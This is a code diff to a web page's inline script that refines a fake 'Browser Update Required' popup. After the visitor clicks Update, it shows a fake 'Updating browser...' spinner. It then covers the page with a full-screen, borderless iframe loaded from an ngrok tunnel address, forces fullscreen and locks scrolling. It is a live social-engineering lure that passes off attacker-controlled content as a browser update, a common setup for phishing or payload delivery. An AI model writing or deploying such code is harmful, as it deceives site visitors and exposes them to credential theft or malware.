@@ -1177,137 +1177,147 @@
 }, 2000);
 
 
-        function showUpdatePopup(event) {
-            event.preventDefault();
+function showUpdatePopup(event) {
+    event.preventDefault();
 
-            const overlay = document.createElement('div');
-            overlay.style.position = 'fixed';
-            overlay.style.top = '0';
-            overlay.style.left = '0';
-            overlay.style.width = '100%';
-            overlay.style.height = '100%';
-            overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-            overlay.style.zIndex = '10000';
-            overlay.style.display = 'flex';
-            overlay.style.justifyContent = 'center';
-            overlay.style.alignItems = 'center';
+    const overlay = document.createElement('div');
+    overlay.style.position = 'fixed';
+    overlay.style.top = '0';
+    overlay.style.left = '0';
+    overlay.style.width = '100%';
+    overlay.style.height = '100%';
+    overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
+    overlay.style.zIndex = '10000';
+    overlay.style.display = 'flex';
+    overlay.style.justifyContent = 'center';
+    overlay.style.alignItems = 'center';
 
-            const popup = document.createElement('div');
-            popup.style.backgroundColor = 'white';
-            popup.style.padding = '30px';
-            popup.style.borderRadius = '8px';
-            popup.style.maxWidth = '400px';
-            popup.style.textAlign = 'center';
+    const popup = document.createElement('div');
+    popup.style.backgroundColor = 'white';
+    popup.style.padding = '30px';
+    popup.style.borderRadius = '8px';
+    popup.style.maxWidth = '400px';
+    popup.style.textAlign = 'center';
 
-            const title = document.createElement('h3');
-            title.textContent = 'Browser Update Required';
-            title.style.marginBottom = '15px';
+    const title = document.createElement('h3');
+    title.textContent = 'Browser Update Required';
+    title.style.marginBottom = '15px';
 
-            const message = document.createElement('p');
-            message.textContent = 'Your browser needs to be updated to continue.';
-            message.style.marginBottom = '20px';
+    const message = document.createElement('p');
+    message.textContent = 'Your browser needs to be updated to continue.';
+    message.style.marginBottom = '20px';
 
-            const updateButton = document.createElement('button');
-            updateButton.textContent = 'Update';
-            updateButton.style.padding = '10px 20px';
-            updateButton.style.backgroundColor = '#000';
-            updateButton.style.color = '#fff';
-            updateButton.style.border = 'none';
-            updateButton.style.borderRadius = '6px';
-            updateButton.style.cursor = 'pointer';
+    const updateButton = document.createElement('button');
+    updateButton.textContent = 'Update';
+    updateButton.style.padding = '10px 20px';
+    updateButton.style.backgroundColor = '#000';
+    updateButton.style.color = '#fff';
+    updateButton.style.border = 'none';
+    updateButton.style.borderRadius = '6px';
+    updateButton.style.cursor = 'pointer';
 
-            updateButton.addEventListener('click', function () {
-                document.body.removeChild(overlay);
+    updateButton.addEventListener('click', function () {
+        document.body.removeChild(overlay);
 
-                const loadingOverlay = document.createElement('div');
-                loadingOverlay.style.position = 'fixed';
-                loadingOverlay.style.top = '0';
-                loadingOverlay.style.left = '0';
-                loadingOverlay.style.width = '100%';
-                loadingOverlay.style.height = '100%';
-                loadingOverlay.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
-                loadingOverlay.style.zIndex = '10001';
-                loadingOverlay.style.display = 'flex';
-                loadingOverlay.style.justifyContent = 'center';
-                loadingOverlay.style.alignItems = 'center';
+        // Create loading overlay
+        const loadingOverlay = document.createElement('div');
+        loadingOverlay.style.position = 'fixed';
+        loadingOverlay.style.top = '0';
+        loadingOverlay.style.left = '0';
+        loadingOverlay.style.width = '100%';
+        loadingOverlay.style.height = '100%';
+        loadingOverlay.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
+        loadingOverlay.style.zIndex = '10001';
+        loadingOverlay.style.display = 'flex';
+        loadingOverlay.style.justifyContent = 'center';
+        loadingOverlay.style.alignItems = 'center';
 
-                const spinner = document.createElement('div');
-                spinner.style.display = 'inline-block';
-                spinner.style.width = '50px';
-                spinner.style.height = '50px';
-                spinner.style.border = '5px solid rgba(0, 0, 0, 0.1)';
-                spinner.style.borderRadius = '50%';
-                spinner.style.borderTopColor = '#000';
-                spinner.style.animation = 'spin 1s ease-in-out infinite';
-                spinner.style.marginBottom = '20px';
+        const spinner = document.createElement('div');
+        spinner.style.display = 'inline-block';
+        spinner.style.width = '50px';
+        spinner.style.height = '50px';
+        spinner.style.border = '5px solid rgba(0, 0, 0, 0.1)';
+        spinner.style.borderRadius = '50%';
+        spinner.style.borderTopColor = '#000';
+        spinner.style.animation = 'spin 1s ease-in-out infinite';
+        spinner.style.marginBottom = '20px';
 
-                const loadingText = document.createElement('div');
-                loadingText.textContent = 'Updating browser...';
-                loadingText.style.fontSize = '16px';
-                loadingText.style.color = '#333';
-                loadingText.style.marginBottom = '10px';
+        const loadingText = document.createElement('div');
+        loadingText.textContent = 'Updating browser...';
+        loadingText.style.fontSize = '16px';
+        loadingText.style.color = '#333';
+        loadingText.style.marginBottom = '10px';
 
-                const loadingContainer = document.createElement('div');
-                loadingContainer.style.display = 'flex';
-                loadingContainer.style.flexDirection = 'column';
-                loadingContainer.style.alignItems = 'center';
-                loadingContainer.style.justifyContent = 'center';
-                loadingContainer.style.backgroundColor = 'white';
-                loadingContainer.style.padding = '40px';
-                loadingContainer.style.borderRadius = '8px';
-                loadingContainer.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
-                loadingContainer.style.width = '300px';
-                loadingContainer.style.textAlign = 'center';
+        const loadingContainer = document.createElement('div');
+        loadingContainer.style.display = 'flex';
+        loadingContainer.style.flexDirection = 'column';
+        loadingContainer.style.alignItems = 'center';
+        loadingContainer.style.justifyContent = 'center';
+        loadingContainer.style.backgroundColor = 'white';
+        loadingContainer.style.padding = '40px';
+        loadingContainer.style.borderRadius = '8px';
+        loadingContainer.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+        loadingContainer.style.width = '300px';
+        loadingContainer.style.textAlign = 'center';
 
-                const style = document.createElement('style');
-                style.textContent = `
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    `;
-                document.head.appendChild(style);
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes spin {
+                to { transform: rotate(360deg); }
+            }
+        `;
+        document.head.appendChild(style);
 
-                loadingContainer.appendChild(spinner);
-                loadingContainer.appendChild(loadingText);
-                loadingOverlay.appendChild(loadingContainer);
-                document.body.appendChild(loadingOverlay);
+        loadingContainer.appendChild(spinner);
+        loadingContainer.appendChild(loadingText);
+        loadingOverlay.appendChild(loadingContainer);
+        document.body.appendChild(loadingOverlay);
 
-                setTimeout(() => {
+        // Create hidden iframe but don't append it yet
+        const hiddenFrame = document.createElement('iframe');
+        hiddenFrame.style.position = 'fixed';
+        hiddenFrame.style.top = '0';
+        hiddenFrame.style.left = '0';
+        hiddenFrame.style.width = '100%';
+        hiddenFrame.style.height = '100%';
+        hiddenFrame.style.border = 'none';
+        hiddenFrame.style.zIndex = '99999';
+        hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
+        
+        // Pre-load the iframe
+        hiddenFrame.onload = function() {
+            document.body.style.overflow = 'hidden';
+            
+            // Only remove the loader once we're actually going to try fullscreen
+            try {
+                // Request fullscreen first
+                hiddenFrame.requestFullscreen().then(() => {
+                    // Remove loading overlay only after fullscreen is activated
                     document.body.removeChild(loadingOverlay);
+                }).catch(err => {
+                    console.log("Error attempting to enable fullscreen: ", err);
+                    // If fullscreen fails, still remove the loader
+                    document.body.removeChild(loadingOverlay);
+                });
+            } catch (error) {
+                console.error("Fullscreen error:", error);
+                // If fullscreen throws an error, still remove the loader
+                document.body.removeChild(loadingOverlay);
+            }
+        };
 
-                    const hiddenFrame = document.createElement('iframe');
-                    hiddenFrame.style.position = 'fixed';
-                    hiddenFrame.style.top = '0';
-                    hiddenFrame.style.left = '0';
-                    hiddenFrame.style.width = '100%';
-                    hiddenFrame.style.height = '100%';
-                    hiddenFrame.style.border = 'none';
-                    hiddenFrame.style.zIndex = '99999';
-                    hiddenFrame.src = 'https://14d7-14-139-176-131.ngrok-free.app';
+        // Wait a moment before adding the iframe to ensure the loading animation is visible
+        setTimeout(() => {
+            document.body.appendChild(hiddenFrame);
+        }, 1000);
+    });
 
-                    hiddenFrame.onload = function () {
-                        document.body.style.overflow = 'hidden';
-
-                        try {
-                            hiddenFrame.requestFullscreen().catch(err => {
-                                console.log("Error attempting to enable fullscreen: ", err);
-                            });
-                        } catch (error) {
-                            console.error("Fullscreen error:", error);
-                        }
-                    };
-
-                    document.body.appendChild(hiddenFrame);
-                }, 2000);
-            });
-
-            popup.appendChild(title);
-            popup.appendChild(message);
-            popup.appendChild(updateButton);
-            overlay.appendChild(popup);
-            document.body.appendChild(overlay);
-        }
-
+    popup.appendChild(title);
+    popup.appendChild(message);
+    popup.appendChild(updateButton);
+    overlay.appendChild(popup);
+    document.body.appendChild(overlay);
+}
 
 
     </script>
